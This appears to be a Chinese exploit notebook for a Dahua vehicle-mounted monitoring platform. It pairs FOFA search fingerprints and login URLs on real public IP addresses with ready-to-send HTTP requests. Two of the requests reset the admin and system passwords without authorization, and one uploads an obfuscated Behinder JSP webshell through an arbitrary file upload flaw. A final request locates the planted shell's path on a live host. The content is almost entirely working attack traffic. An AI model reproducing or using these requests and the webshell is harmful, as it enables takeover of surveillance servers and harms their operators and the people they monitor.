# 大华车载监控平台

    ## fofa

```
icon_hash="411052691"
title=="Exception" && "系统正忙，请稍后重试"
```

## 登录口

```
https://221.5.65.82:899/admin/login_login.action#
https://221.5.65.82:899/config/user_toLoginPage.action
```

## 配置系统任意密码重置

修改为admin/Aa112233

```
POST /config/user_passwordReset.action?nowTime=1662449299721 HTTP/1.1
Host: 221.5.65.82:899
Connection: close
Content-Length: 346
sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: https://221.5.65.82:899
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://221.5.65.82:899/config/user_initPasswordReset.action?t=1662449256362
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=8EFCAC96D2EEF42CA0F7ACA18C491016; random=7j0fstzufuu; JSESSIONID=A6683C873CB8549B04A50677BE1BA39A

userBean.loginName=admin&userBean.loginPass=%24D%24S%24S%240778d46eadf8a31cb00ce8d1be64e12e&userBean.questionNumber1=6&userBean.questionAnswer1=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber2=1&userBean.questionAnswer2=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber3=7&userBean.questionAnswer3=1d0383dcf3670a5ea80b017382d66623
```

## 车载监控平台密码重置(密保1才可)

修改为system/Aa112233

```
POST /admin/login_updatePass.action?nowTime=1662450246031 HTTP/1.1
Host: 221.5.65.82:899
Connection: close
Content-Length: 228
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: https://221.5.65.82:899
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://221.5.65.82:899/admin/login_login.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: userNameArray=system; random=fj8b4raskbc; JSESSIONID=958F2BB3F054FA04324881161DE7361A; JSESSIONID=A6683C873CB8549B04A50677BE1BA39A

userBean.newLoginPass=6fb188a448d824278fa7fdf0bccc97ce&userBean.questionAnswer1=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer2=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer3=a0b5d0071821c2d338d05f1127a1b93c
```

## 任意文件上传

### 上传

默认9002端口 冰蝎马

9002/tcp open  dynamid

```
POST /vehicleServer/carDev/icon/import/1?iconType=1 HTTP/1.1
Host: 218.75.146.232:9002
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Length: 872
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydoqRz6gbJn1soiTe
Origin: https://218.75.146.232:9999
Referer: https://218.75.146.232:9999/views/client.html
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.9.1 Chrome/56.0.2924.122 Safari/537.36

------WebKitFormBoundarydoqRz6gbJn1soiTe
Content-Disposition: form-data; name="file"; filename="222.jsp"
Content-Type: image/png

GIF89a
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class HFDB extends ClassLoader{HFDB(ClassLoader UYGS){super(UYGS);}public Class OANU(byte []b){return super.d\uuuuuuuuuuuuuuuuuuuuuuuuuuuu0065fineClass(b,0,b.length);}}%><%if (request.\u0067etMethod().\u0065quals("POST")){String WRQO="e45e329feb5d925b";session.putValue("u",WRQO);Cipher UYGS=Cipher.\u0067etInstance("AES");UYGS.init(2,new SecretKeySpec(WRQO.\u0067etBytes(),"AES"));new HFDB(this.\u0067etClass().\u0067etClassLoader()).OANU(UYGS.doFinal(new sun.misc.\u0042A\u0053E\u00364De\u0063o\u0064\u0065\u0072().d\u0065codeBuffer(request.\u0067etReader().readLine()))).newInstance().\u0065quals(pageContext);}%>
------WebKitFormBoundarydoqRz6gbJn1soiTe--
```

![image-20210907123504418](/Users/conan/Desktop/0day/大华车载监控平台/漏洞.assets/image-20210907123504418.png)

### 获取路径

```
GET /vehicleServer/carDev/icon/getIconList?nowTime=164605907220 HTTP/1.1
Host: 218.75.146.232:9002
Connection: close
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=7853B040E156BC79C6664CAF429AA5E7
```

![image-20210907123521492](/Users/conan/Desktop/0day/大华车载监控平台/漏洞.assets/image-20210907123521492.png)

https://218.75.146.232:9999/upload/vec_saas/vehicleType/icon/1cccc944144f4668b29fe7a2b17b3b44.jsp
